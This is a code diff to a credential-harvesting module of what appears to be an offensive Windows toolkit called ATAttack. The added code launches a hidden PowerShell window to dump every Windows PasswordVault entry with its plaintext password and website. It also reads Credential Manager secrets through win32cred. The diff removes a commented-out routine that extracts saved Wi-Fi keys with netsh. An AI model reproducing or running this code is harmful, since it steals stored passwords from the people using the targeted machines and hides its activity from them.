@@ -5,14 +5,13 @@ import sqlite3
 import win32crypt
 import configparser
 import shutil
+import re
 import win32cred
 import random,string
 import os
-import re
 from ATAttack.framework.constant import constant
-from ATAttack.framework.prints import print_success
-
-
+import subprocess
+import _subprocess as sub
 import tempfile
 
 tmp = tempfile.gettempdir()
@@ -103,41 +102,78 @@ class decypt():
             if os.path.isfile(filename):
                 shutil.copy(filename, constant.upload_dir)
 
-
     def ie_decrypt(self):
 
-        CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
-        CredRead = win32cred.CredRead
-        creds = win32cred.CredEnumerate(None, 0)  # Enumerate credentials
-        credentials = []
-        for package in creds:
-            try:
-                target = package['TargetName']
-                creds = CredRead(target, CRED_TYPE_GENERIC)
-                credentials.append(creds)
-            except Exception:
-                pass
-        values = {}
-        for cred in credentials:
-            values['service'] = cred['TargetName']
-            values['UserName'] = cred['UserName']
-            values['pwd'] = cred['CredentialBlob'].decode('utf16')
-        print values
 
+        try:
+            cmdline = '''
+                    try
+                    {
+                        #Load the WinRT projection for the PasswordVault
+                        $Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+                        $Script:vault	  = new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
+                    }
+                    catch
+                    {
+                        throw "This module relies on functionality provided in Windows 8 or Windows 2012 and above."
+                    }
+                    #endregion
+    
+                    function Get-VaultCredential
+                    {
+                        process
+                        {
+                            try
+                            {
+                                &{
+                                    $Script:vault.RetrieveAll()
+                                } | foreach-Object {  $_.RetrievePassword() ; "Username......";$_.UserName;"######";"Password......";$_.Password;"######";"Website......";$_.Resource;"_________" }
+                            }
+                            catch
+                            {
+                                Write-Error -ErrorRecord $_ -RecommendedAction "Check your search input - user: $UserName resource: $Resource"
+                            }
+                        }
+                        end
+                        {
+                            Write-Debug "[$cmdName] Exiting function"
+                        }
+                    }
+                    Get-VaultCredential
+                    '''
 
-    # def decrypt_using_netsh(self):
-    #     print_success("Attempt to get system WiFi password")
-    #     try:
-    #         values = []
-    #         process = os.popen('netsh wlan show profiles').read()
-    #         wifi_name = re.findall(':\s+.+', str(process))
-    #         for wifi in wifi_name:
-    #             wifi_ = wifi.replace(': ', '')
-    #             key = os.popen('netsh wlan show profiles "{}" key=clear'.format(wifi_)).read()
-    #             _password = re.findall('(?<=Key Content\s\s\s\s\s\s\s\s\s\s\s\s:)[\s\S]*(?=\n\nCost)', str(key))
-    #             if _password:
-    #                 _wifi = 'SSID' + ":" + str(wifi_) + "|" + "PAssword" + ":" + str(_password)
-    #                 values.append(_wifi)
-    #         print values
-    #     except Exception:
-    #         pass
+            command = ['powershell.exe', '/c', cmdline]
+
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = sub.STARTF_USESHOWWINDOW | sub.CREATE_NEW_PROCESS_GROUP
+            info.wShowWindow = sub.SW_HIDE
+            p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE,
+                                 universal_newlines=True)
+            results, _ = p.communicate()
+            passwords = []
+            for result in results.replace('\n', '').split('_________'):
+                values = {}
+                if result:
+                    for res in result.split('######'):
+                        values[res.split('......')[0]] = res.split('......')[1]
+                    passwords.append(values)
+            print "Get common credentials for windows vault :" + "\n" + str(passwords)
+            CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
+            CredRead = win32cred.CredRead
+            creds = win32cred.CredEnumerate(None, 0)  # Enumerate credentials
+            credentials = []
+            for package in creds:
+                try:
+                    target = package['TargetName']
+                    creds = CredRead(target, CRED_TYPE_GENERIC)
+                    credentials.append(creds)
+                except Exception:
+                    pass
+            values_ = {}
+            for cred in credentials:
+                values_['service'] = cred['TargetName']
+                values_['UserName'] = cred['UserName']
+                values_['pwd'] = cred['CredentialBlob'].decode('utf16')
+            print "Get windows vault web credentials :" + "\n" + str(values_)
+        except Exception:
+            pass
